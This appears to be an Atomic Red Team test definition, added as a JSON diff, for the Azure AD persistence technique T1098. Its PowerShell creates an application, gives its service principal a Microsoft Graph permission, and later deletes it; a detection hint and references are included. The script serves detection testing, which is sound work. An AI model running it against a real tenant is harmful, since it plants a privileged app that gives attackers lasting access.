@@ -1,0 +1,123 @@
+{
+  "id": "94ea9cc3-81f9-4111-8dde-3fb54f36af4b",
+  "name": "Azure AD - adding permission to application",
+  "description": "The adversaries want to add permission to newly created application. Application could be then used for persistence or for further operation in the attacked infrastructure. Permissions like AppRoleAssignment.ReadWrite.All or RoleManagement.ReadWrite.Directory in particular can be a valuable target for a threat actor.\nThis technique will create a new app, with the provided name, and give it the provided permission. But if you prefer to add credentials to an existing app, replace in the code: \"Get-AzureADApplication\" instead of \"New-AzureADServicePrincipal\".\nThe DirectoryRecommendations.Read.All permissions has been selected as the default.\n\nThe account you use to run the PowerShell command should have Global Administrator/Application Administrator/Cloud Application Administrator role in your Azure AD.\n\nDetection hint - check Operation Name \"Add app role assignment to service principal\" in subscriptions Activity Logs.\nYou can also take a look at the materials:\nhttps://learnsentinel.blog/2022/01/04/azuread-privesc-sentinel/\nhttps://github.com/reprise99/Sentinel-Queries\nhttps://docs.google.com/presentation/d/1AWx1w0Xcq8ENvOmSjAJswEgEio-il09QWZlGg9PbHqE/edit#slide=id.g10460eb209c_0_2766\nhttps://gist.github.com/andyrobbins/7c3dd62e6ed8678c97df9565ff3523fb\n",
+  "platforms": [
+    "azure-ad"
+  ],
+  "steps": [
+    {
+      "id": "a37b7194-6511-40e9-b635-e5407bf08232",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = New-AzureADApplication -DisplayName \"#{application_name}\"\n$servicePrincipal = New-AzureADServicePrincipal -AppId $aadApplication.AppId\n#$aadApplication = Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\"\n\n#Get Service Principal of Microsoft Graph Resource API \n$graphSP = Get-AzureADServicePrincipal -Filter \"DisplayName eq 'Microsoft Graph'\"\n\n#Initialize RequiredResourceAccess for Microsoft Graph Resource API \n$requiredGraphAccess = New-Object Microsoft.Open.AzureAD.Model.RequiredResourceAccess\n$requiredGraphAccess.ResourceAppId = $graphSP.AppId\n$requiredGraphAccess.ResourceAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.ResourceAccess]\n\n#Set Application Permissions\n$ApplicationPermissions = @('#{application_permission}')\n\n$reqPermission = $graphSP.AppRoles | Where-Object {$_.Value -eq $ApplicationPermissions}\nif($reqPermission)\n{\n$resourceAccess = New-Object Microsoft.Open.AzureAD.Model.ResourceAccess\n$resourceAccess.Type = \"Role\"\n$resourceAccess.Id = $reqPermission.Id    \n#Add required app permission\n$requiredGraphAccess.ResourceAccess.Add($resourceAccess)\n}\nelse\n{\nWrite-Host \"App permission $permission not found in the Graph Resource API\" -ForegroundColor Red\n}\n\n#Add required resource accesses\n$requiredResourcesAccess = New-Object System.Collections.Generic.List[Microsoft.Open.AzureAD.Model.RequiredResourceAccess]\n$requiredResourcesAccess.Add($requiredGraphAccess)\n\n#Set permissions in existing Azure AD App\nSet-AzureADApplication -ObjectId $aadApplication.ObjectId -RequiredResourceAccess $requiredResourcesAccess\n\n$servicePrincipal = Get-AzureADServicePrincipal -Filter \"AppId eq '$($aadApplication.AppId)'\"\n\nNew-AzureADServiceAppRoleAssignment -ObjectId $servicePrincipal.ObjectId -PrincipalId $servicePrincipal.ObjectId -ResourceId $graphSP.ObjectId -Id $reqPermission.Id\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "408d9990-ae3f-4280-9baa-cd521fee1a13",
+      "type": "execute-command",
+      "data": {
+        "command": "Import-Module -Name AzureAD\n$PWord = ConvertTo-SecureString -String \"#{password}\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"#{username}\", $Pword\nConnect-AzureAD -Credential $Credential\n\n$aadApplication = @(Get-AzureADApplication -Filter \"DisplayName eq '#{application_name}'\")\nIf ($aadApplication.Count -eq 0)\n{\n  Write-Host \"App not found: cannot delete it\"\n  exit\n}\nElseIf ($aadApplication.Count -gt 1)\n{\n  Write-Host \"Found several app with name '#{application_name}': one is likely the one this technique created, but as a precaution, none will be deleted. Manual cleanup is required.\"\n  exit\n}\nElse\n{\n  Remove-AzureADApplication -ObjectId $aadApplication[0].ObjectId\n  Write-Host \"Successfully deleted app\"\n}\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "601caa1b-1f90-4c8d-ba8d-f08bec3a93b2",
+      "name": "Check dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "26b402ef-2850-49a9-baa8-71ec9403b88b",
+      "name": "Resolve dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "Install-Module -Name AzureAD -Force\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "83784c13-4afe-4633-8b13-0c9a97803c3d",
+      "name": "Re-check dependency 1/1",
+      "description": "AzureAD module must be installed.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "try {if (Get-InstalledModule -Name AzureAD -ErrorAction SilentlyContinue) {exit 0} else {exit 1}} catch {exit 1}\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "a37b7194-6511-40e9-b635-e5407bf08232",
+      "p": "on-success",
+      "o": "408d9990-ae3f-4280-9baa-cd521fee1a13"
+    },
+    {
+      "s": "a37b7194-6511-40e9-b635-e5407bf08232",
+      "p": "on-failure",
+      "o": "408d9990-ae3f-4280-9baa-cd521fee1a13"
+    },
+    {
+      "s": "601caa1b-1f90-4c8d-ba8d-f08bec3a93b2",
+      "p": "on-success",
+      "o": "a37b7194-6511-40e9-b635-e5407bf08232"
+    },
+    {
+      "s": "601caa1b-1f90-4c8d-ba8d-f08bec3a93b2",
+      "p": "on-failure",
+      "o": "26b402ef-2850-49a9-baa8-71ec9403b88b"
+    },
+    {
+      "s": "26b402ef-2850-49a9-baa8-71ec9403b88b",
+      "p": "on-success",
+      "o": "83784c13-4afe-4633-8b13-0c9a97803c3d"
+    },
+    {
+      "s": "83784c13-4afe-4633-8b13-0c9a97803c3d",
+      "p": "on-failure",
+      "o": "a37b7194-6511-40e9-b635-e5407bf08232"
+    }
+  ],
+  "tags": [
+    "T1098",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "username",
+      "type": "string",
+      "description": "Azure AD username",
+      "value": "jonh@contoso.com"
+    },
+    {
+      "name": "password",
+      "type": "string",
+      "description": "Azure AD password",
+      "value": "p4sswd"
+    },
+    {
+      "name": "application_name",
+      "type": "string",
+      "description": "Name of the targeted application that will be created",
+      "value": "test_app"
+    },
+    {
+      "name": "application_permission",
+      "type": "string",
+      "description": "Permission from Microsoft Graph Resource API that will be added to application",
+      "value": "DirectoryRecommendations.Read.All"
+    }
+  ]
+}
